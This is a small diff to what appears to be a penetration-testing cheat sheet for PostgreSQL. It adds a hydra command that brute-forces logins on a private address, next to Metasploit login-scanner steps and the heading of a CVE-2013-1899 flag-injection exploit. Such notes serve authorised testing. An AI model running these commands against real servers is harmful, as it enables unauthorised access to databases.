@@ -13,6 +13,9 @@ use auxiliary/scanner/postgres/postgres_login
 show options
 run
 
+# Bruteforce (hydra)
+hydra -L usernames.txt -P passwords.txt 192.168.2.62 postgres -V
+
 # Exploit - PostgreSQL Database Name Command Line Flag Injection (metasploit)
 ;; Identify PostgreSQL 9.0, 9.1, and 9.2 servers that are vulnerable to
 ;; command-line flag injection through CVE-2013-1899. This can lead to
